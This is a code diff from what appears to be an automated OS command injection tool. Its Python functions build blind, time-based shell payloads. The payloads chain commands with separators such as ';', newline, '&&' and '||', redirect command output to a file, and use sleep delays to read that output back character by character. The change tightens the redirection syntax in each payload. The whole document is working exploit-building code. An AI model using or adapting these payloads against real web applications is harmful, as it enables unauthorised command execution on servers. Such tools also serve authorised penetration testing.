@@ -56,7 +56,7 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, delay, http_request_method):
   else:
     if separator == ";" :
       payload = (separator +
-                "str=$(echo " + TAG + " > " + OUTPUT_TEXTFILE + ")" + separator +
+                "str=$(echo " + TAG + ">" + OUTPUT_TEXTFILE + ")" + separator +
                 "str=$(cat " + OUTPUT_TEXTFILE + ")" + separator +
                 # Find the length of the output.
                 "str1=${#str}" + separator +
@@ -69,7 +69,7 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, delay, http_request_method):
     elif separator == "%0a" :
       separator = "\n"
       payload = (separator +
-                "str=$(echo " + TAG + " > " + OUTPUT_TEXTFILE + ")" + separator +
+                "str=$(echo " + TAG + ">" + OUTPUT_TEXTFILE + ")" + separator +
                 "str=$(cat " + OUTPUT_TEXTFILE + ")" + separator +
                 # Find the length of the output.
                 "str1=${#str}" + separator +
@@ -87,7 +87,7 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, delay, http_request_method):
         ampersand = "&"
       payload = (ampersand +
                 "sleep 0 " + separator +
-                "str=$(echo " + TAG + " > " + OUTPUT_TEXTFILE + ") " + separator +
+                "str=$(echo " + TAG + ">" + OUTPUT_TEXTFILE + ") " + separator +
                 "str=$(cat " + OUTPUT_TEXTFILE + ") " + separator +
                 "str1=${#str} " + separator +
                 "[ " + str(j) + " -eq ${str1} ] " + separator +
@@ -99,7 +99,7 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, delay, http_request_method):
     elif separator == "||" :
       pipe = "|"
       payload = (pipe +
-                "echo " + TAG + " > " + OUTPUT_TEXTFILE + " " + pipe + 
+                "echo " + TAG + ">" + OUTPUT_TEXTFILE + " " + pipe + 
                 "[ " + str(j) + " -ne $(cat " + OUTPUT_TEXTFILE + pipe + "tr -d '\\n'" + pipe + "wc -c) ] " + separator +
                 "sleep " + str(delay) + " "
                 )  
@@ -245,7 +245,7 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, delay, http_request_method
   else:
     if separator == ";" :
       payload = (separator +
-                "str=$(" + cmd + " > " + OUTPUT_TEXTFILE + separator + " tr '\\n' ' ' < " + OUTPUT_TEXTFILE + " )" + separator +
+                "str=$(" + cmd + ">" + OUTPUT_TEXTFILE + separator + " tr '\\n' ' ' < " + OUTPUT_TEXTFILE + " )" + separator +
                 "echo $str > " + OUTPUT_TEXTFILE + separator +
                 "str=$(cat " + OUTPUT_TEXTFILE + ")" + separator +
                 # Find the length of the output.
@@ -262,7 +262,7 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, delay, http_request_method
     elif separator == "%0a" :
       separator = "\n"
       payload = (separator +
-                "str=$(" + cmd + " > " + OUTPUT_TEXTFILE + separator + " tr '\\n' ' ' < " + OUTPUT_TEXTFILE + " )" + separator +
+                "str=$(" + cmd + ">" + OUTPUT_TEXTFILE + separator + " tr '\\n' ' ' < " + OUTPUT_TEXTFILE + " )" + separator +
                 "echo $str > " + OUTPUT_TEXTFILE + separator +
                 "str=$(cat " + OUTPUT_TEXTFILE + ")" + separator +
                 # Find the length of the output.
@@ -284,7 +284,7 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, delay, http_request_method
         ampersand = "&"
       payload = (ampersand +
                 "sleep 0 " + separator +
-                "str=$(" + cmd + " > " + OUTPUT_TEXTFILE + separator + " tr '\\n' ' ' < " + OUTPUT_TEXTFILE + " )" + separator +
+                "str=$(" + cmd + ">" + OUTPUT_TEXTFILE + separator + " tr '\\n' ' ' < " + OUTPUT_TEXTFILE + " )" + separator +
                 "echo $str > " + OUTPUT_TEXTFILE + separator +
                 "str=$(cat " + OUTPUT_TEXTFILE + ")" + separator +
                 # Find the length of the output.
